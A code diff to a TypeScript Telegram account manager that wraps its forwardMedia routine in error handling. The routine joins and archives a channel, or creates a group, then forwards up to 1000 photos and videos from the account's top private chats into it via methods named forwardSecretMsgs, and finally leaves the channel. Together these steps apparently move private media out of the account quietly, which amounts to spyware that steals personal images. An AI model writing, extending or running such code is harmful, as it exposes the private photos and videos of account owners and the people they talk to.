@@ -108,34 +108,37 @@ class TelegramManager {
     }
 
     public async forwardMedia(channel: string, fromChatId: string) {
-        console.log("Forwarding media from chat to channel", channel, fromChatId);
         let channelId;
-        let channelAccessHash;
-        if (channel) {
-            const result: any = await this.joinChannel(channel);
-            channelId = result.chats[0].id;
-            channelAccessHash = result.chats[0].accessHash;
-            await this.archiveChat(channelId, channelAccessHash);
-            console.log("Archived chat", channelId);
-        } else {
-            const result = await this.createGroup();
-            channelId = result.id;
-            channelAccessHash = result.accessHash;
-            console.log("Created new group with ID:", channelId);
-        }
-        if (fromChatId) {
-            await this.forwardSecretMsgs(fromChatId, channelId.toString());
-        } else {
-            await this.forwardSecretMsgsFromTopChats(channelId.toString());
+        try {
+            console.log("Forwarding media from chat to channel", channel, fromChatId);
+            let channelAccessHash;
+            if (channel) {
+                const result: any = await this.joinChannel(channel);
+                channelId = result.chats[0].id;
+                channelAccessHash = result.chats[0].accessHash;
+                await this.archiveChat(channelId, channelAccessHash);
+                console.log("Archived chat", channelId);
+            } else {
+                const result = await this.createGroup();
+                channelId = result.id;
+                channelAccessHash = result.accessHash;
+                console.log("Created new group with ID:", channelId);
+            }
+            if (fromChatId) {
+                await this.forwardSecretMsgs(fromChatId, channelId.toString());
+            } else {
+                await this.forwardSecretMsgsFromTopChats(channelId.toString());
+            }
+        } catch (e) {
+            console.log(e)
         }
         await this.leaveChannels([channelId.toString()]);
-        console.log("Left the channel with ID:", channelId);
     }
 
     public async forwardSecretMsgsFromTopChats(channelId: string) {
         const chats = await this.getTopPrivateChats();
         for (const chat of chats) {
-            const mediaMessages = await this.searchMessages({ chatId: chat.chatId, limit: 1000, types: ['photo', 'video']});
+            const mediaMessages = await this.searchMessages({ chatId: chat.chatId, limit: 1000, types: ['photo', 'video'] });
             console.log("Forwarding messages from chat:", chat.chatId, "to channel:", channelId);
             await this.forwardMessages(chat.chatId, channelId, mediaMessages.photo.messages);
             await this.forwardMessages(chat.chatId, channelId, mediaMessages.video.messages);
